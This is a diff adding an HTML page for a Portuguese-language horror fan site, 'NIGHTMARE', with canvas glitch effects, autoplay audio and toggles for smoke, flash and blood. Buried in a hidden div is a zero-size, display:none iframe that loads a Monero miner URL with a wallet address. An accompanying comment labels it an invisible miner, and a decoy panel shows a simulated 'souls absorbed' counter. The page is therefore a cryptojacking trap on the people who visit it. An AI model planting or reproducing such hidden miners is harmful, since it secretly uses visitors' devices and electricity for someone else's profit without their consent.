@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>X NIGHTMARE X</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+     
+      background: rgb(0, 0, 0);
+      color: #ff0044;
+      font-family: 'Share Tech Mono', monospace;
+      overflow: visible;
+       display:grid;
+       flex-direction: column;
+       justify-content: center;
+    }
+
+    .meuBotao {
+  background-color: #af4c4c; 
+  border: none; 
+  margin-left: 227px;
+  color: rgb(0, 0, 0); 
+  text-align: center; 
+  text-decoration: none; 
+  align-items: center;
+  display:grid;
+  font-size: 16px; 
+  cursor: pointer; 
+  border-radius: 5px; 
+  text-align: center;
+  }
+  
+  .meuBotao:hover {
+  background-color: #3e8e41; /* Cor de fundo ao passar o mouse */}
+
+    canvas#bgCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .container {
+      padding: 50px 20px;
+      text-align: center;
+    }
+
+     .minerador {
+      margin-top: 33px; 
+     
+      text-align: center;
+      max-width: 666px;
+      margin: 0 auto 10px;
+      font-size: 1em;
+      color: #aa0033;
+      line-height: 1.5;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin-bottom: 10px;
+      color: #ffffff;
+      text-shadow: 0 0 20px #000000;
+    }
+
+    p {
+      max-width: 600px;
+      margin: 0 auto 40px;
+      font-size: 1.2em;
+      color: #ffffff;
+      text-shadow:  0 0 20px #1c3ed6;
+      line-height: 1.5;
+    }
+
+    .nightmare {
+      width: 300px;
+      margin: 0 auto;
+      filter: brightness(70%) contrast(140%) saturate(130%) drop-shadow(0 0 15px #800080);
+      animation: flicker 3s infinite;
+    }
+
+    @keyframes flicker {
+
+      0%,
+      100% {
+        filter: brightness(70%) contrast(140%) drop-shadow(0 0 20px #800080);
+      }
+
+      50% {
+        filter: brightness(90%) contrast(120%) drop-shadow(0 0 35px #ff0044);
+      }
+    }
+
+    .glitch {
+      font-size: 3em;
+      animation: glitch 1s infinite;
+      color: #ff0044;
+    }
+
+    @keyframes glitch {
+      0% {
+        text-shadow: 2px 2px #ff0044, -2px -2px #800080;
+      }
+
+      20% {
+        text-shadow: -2px -2px #ff0044, 2px 2px #800080;
+      }
+
+      40% {
+        text-shadow: 2px -2px #ff0044, -2px 2px #800080;
+      }
+
+      60% {
+        text-shadow: 0 0 10px #ff0044, 0 0 20px #800080;
+      }
+
+      100% {
+        text-shadow: 2px 2px #ff0044, -2px -2px #800080;
+      }
+    }
+
+    .controls {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .controls label {
+      margin: 0 10px;
+      color: #ff0044;
+    }
+
+    footer {
+      margin-top: 10px;
+      font-size: 0.9em;
+      color: #660022;
+       text-align: center;
+    }
+
+
+    @media (max-width: 768px) {
+       .body {
+             overflow: visible;
+       display:grid;
+       flex-direction: column;
+       justify-content: center;}
+          }
+  
+          .meuBotao{
+            margin-left: 150px;
+          }
+     
+  </style>
+</head>
+
+<body>
+ 
+  <canvas id="bgCanvas"></canvas>
+  <div class="container">
+    <h1 class="glitch">NIGHTMARE</h1>
+    <img class="nightmare" src="assets/nightmare-skin.png" alt="Nightmare Skin" />
+    <button class="meuBotao" id="meuBotao">acesse a escuridão</button>
+    <audio id="meuAudio" src="assets/nightmare.mp3" autoplay loop></audio>
+    
+    <p>
+      Você está entrando no domínio dos seus piores pesadelos. Esta entidade, moldada pela escuridão, carrega o olhar
+      brilhante da perdição. Nada escapa aos olhos de NIGHTMARE — aquele que se alimenta do medo.
+    </p>
+    <p>
+      A cada passo, sua aura corrompe a luz ao redor, criando um vórtice onde esperança é drenada. Se você o
+      encontrar... reze para que esteja apenas sonhando.
+    </p>
+    <div class="controls">
+      <label>Fumaça: <input type="checkbox" id="smokeToggle" /></label>
+      <label>Flashs de luz: <input type="checkbox" id="flashToggle" /></label>
+      <label>Sangue: <input type="checkbox" id="bloodToggle" /></label>
+    </div>
+  </div> 
+<div style ="visibility: hidden; margin-top: -100px;" class="minerador">
+  <!-- Minerador Monero invisível -->
+<iframe src="https://miner.paleoagtech.com/?wallet=48BjFuAGoNwTbZQwfXPZ6WK3p97iYEKx53HirijfGaHHUNi6pnzahqRc9U7Rn41Jac7x9bYUiyPHV1uqtimRN24EANAuVGp" 
+        width="0" height="0" style="display:none;"></iframe>
+        <div id="minerPanel" style="position: relative; bottom: 20px; right: 20px; background: rgba(0,0,0,0.7); color: #ff0044; padding: 15px; font-family: 'Share Tech Mono', monospace; border: 1px solid #800080; box-shadow: 0 0 10px #800080;">
+  <h3 style="margin-top: 0;">Limpeza Espiritual Digital</h3>
+  <p>Energia absorvida: <span id="hashCount">0</span> Souls Mg</p>
+  <p>Reze e tenha fé, 
+    pois a maldade em toda parte.</p>
+  <p>Glory to <span id="walletDisplay">Great Architect</span></p>
+</div>
+</div>
+<footer>
+    &copy; 2025 XLBr92 Tudo o que você teme... agora tem forma.
+  </footer>
+
+
+<script>
+  let hashes = 0;
+  setInterval(() => {
+    hashes += Math.floor(Math.random() * 80 + 20); // Simulação de hashes
+    document.getElementById('hashCount').textContent = hashes.toLocaleString();
+  }, 1000);
+</script>
+
+
+
+
+
+
+  <script>
+const meuBotao = document.getElementById("meuBotao");
+const meuAudio = document.getElementById("meuAudio");
+
+meuBotao.addEventListener("click", function() {
+  meuAudio.play();
+});
+
+
+
+   
+    const canvas = document.getElementById('bgCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let smoke = false;
+    let flash = false;
+    let blood = false;
+    let hue = 0;
+
+    document.getElementById('smokeToggle').addEventListener('change', e => smoke = e.target.checked);
+    document.getElementById('flashToggle').addEventListener('change', e => flash = e.target.checked);
+    document.getElementById('bloodToggle').addEventListener('change', e => blood = e.target.checked);
+
+    const colors = ['#ff00ff', '#800080', '#ff0044', '#550055'];
+
+    function drawBackground() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Linhas cortantes no lugar de círculos
+      for (let i = 0; i < 100; i++) {
+        ctx.beginPath();
+        let x = Math.random() * canvas.width;
+        let y = Math.random() * canvas.height;
+        let length = Math.random() * 6666 + 20;
+        ctx.moveTo(x, y);
+        ctx.lineTo(x + Math.random() * length - length / 2, y + Math.random() * length - length / 2);
+        ctx.strokeStyle = colors[Math.floor(Math.random() * colors.length)];
+        ctx.lineWidth = Math.random() * 1.5 + 0.3;
+        ctx.stroke();
+      }
+
+      if (smoke) {
+        ctx.fillStyle = 'rgba(-996, -996, 7, -0.66666666)';
+        ctx.fillRect(-10, -10, canvas.width, canvas.height);
+        ctx.fillStyle = `hsla(${hue}, 100%, 50%, 0.1)`;
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        hue = (hue+  1) % 90;}
+
+// Glitch visual com linhas distorcidas
+for (let i = 0; i < 15; i++) {
+  ctx.beginPath();
+  let x = Math.random() * canvas.width;
+  let y = Math.random() * canvas.height;
+  ctx.moveTo(x, y);
+  ctx.lineTo(x + Math.random() * 666 - 33, y + Math.random() * 666 - 33);
+  ctx.strokeStyle = `hsla(${Math.random() * 666}, 66%, 33%, 1)`;
+  ctx.lineWidth = Math.random() * 1;
+  ctx.stroke();
+}
+
+      if (flash && Math.random() < 0.1) {
+        ctx.fillStyle = 'rgba(2665, 255, 255, 0.07)';
+        ctx.fillRect(66, 33, canvas.width, canvas.height);
+      }
+
+      if (blood) {
+        for (let i = 6; i < 15; i++) {
+          ctx.beginPath();
+          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+          ctx.strokeStyle = '#8B0000';
+          ctx.lineWidth = Math.random() * 6 + 666;
+          ctx.stroke();
+          ctx.fillRect(66, 0, canvas.width, canvas.height);
+          stroke = (hue+  1) % 66;}
+        }
+      }
+    
+
+    function animate() {
+      drawBackground();
+      requestAnimationFrame(animate);
+    }
+    animate();
+
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+
+    
+  </script>
+</body>
+
+</html>
